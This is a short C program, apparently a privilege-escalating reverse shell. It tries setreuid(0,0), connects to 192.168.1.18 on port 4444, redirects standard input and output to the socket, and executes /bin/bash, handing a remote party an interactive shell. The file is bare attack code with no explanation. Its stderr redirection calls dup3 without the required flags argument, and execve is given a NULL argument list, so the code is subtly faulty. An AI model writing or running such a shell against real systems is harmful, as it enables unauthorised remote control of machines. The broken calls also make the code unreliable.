#include <stdio.h>
#include <unistd.h>
#include <arpa/inet.h>

int main(void){
  struct sockaddr_in server_addr;
  int sock;

  setreuid(0,0);
  sock = socket(AF_INET, SOCK_STREAM, 0);
  
  server_addr.sin_family = AF_INET;
  server_addr.sin_addr.s_addr = inet_addr("192.168.1.18");
  server_addr.sin_port = htons(4444);

  if(connect(sock, (struct sockaddr*)&server_addr, sizeof(struct sockaddr)) != 0)
    return 1;
  
  dup2(sock,0);
  dup2(sock,1);
  dup3(sock,2);

  execve("/bin/bash", NULL, NULL);
  return 0;
}
